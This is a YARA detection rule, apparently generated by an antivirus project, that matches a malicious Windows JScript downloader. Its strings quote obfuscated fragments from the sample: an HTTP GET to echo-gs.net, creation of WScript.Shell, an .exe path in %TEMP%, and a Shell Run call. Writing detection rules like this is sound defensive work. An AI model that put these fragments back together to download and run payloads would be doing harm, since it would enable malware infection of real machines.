rule sig_20160401_982aa09f87d7f3b774fbcf794b1b9955 {
  meta:
    description = "datamaliciousorder - file 20160401_982aa09f87d7f3b774fbcf794b1b9955.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a05d1003359613479e946a57c1f565b85125a1b3077d00b883c62a8a2c362a80"

  strings:
    $s1  = "YgKx[UidPnp](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "function CmaCw(PhHdo, PpKwk){SkhXt = SkhXt * 1; return PhHdo - PpKwk;};" fullword ascii
    $s3  = "var HfUm = function ViqFa() {return WScript[IjbYc](\"WScript\"+\".Shell\");}(), IrhCy = 11;" fullword ascii
    $s4  = "if (YgKx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JnFoe() {return HfUm[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1ELk6eEro9GO.ex\" + \"e\";};" fullword ascii
    $s6  = "function RhCk(){return HnxRf + \"\";};" fullword ascii
    $s7  = "function TsKn() {return ((YuQa == true) && (YuQa == NojNi)) ? 1 : SkhXt;};" fullword ascii
    $s8  = "var TjGrk = false;" fullword ascii
    $s9  = "function QfOea(){return IjbYc;};" fullword ascii
    $s10 = "function EvgWh()" fullword ascii
    $s11 = "var NojNi = false;" fullword ascii
    $s12 = "var YuQa = false;" fullword ascii
    $s13 = "function RhqXg(WfAjy) {var OgZfo = (1, 2, 3, 4, 5, WfAjy); return OgZfo;};" fullword ascii
    $s14 = "NojNi = true; " fullword ascii
    $s15 = "return CmaCw(IhnZl, BmvCj);" fullword ascii
    $s16 = "YuQa = true; " fullword ascii
    $s17 = "}while (BraWlm);" fullword ascii
    $s18 = "var ZtoEx = new this[\"Date\"]();" fullword ascii
    $s19 = "function ZoWuy(){return 23;};" fullword ascii
    $s20 = "function MjRh(CoEfd){HfUm[\"R\"+\"un\"](CoEfd, SkhXt, SkhXt);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}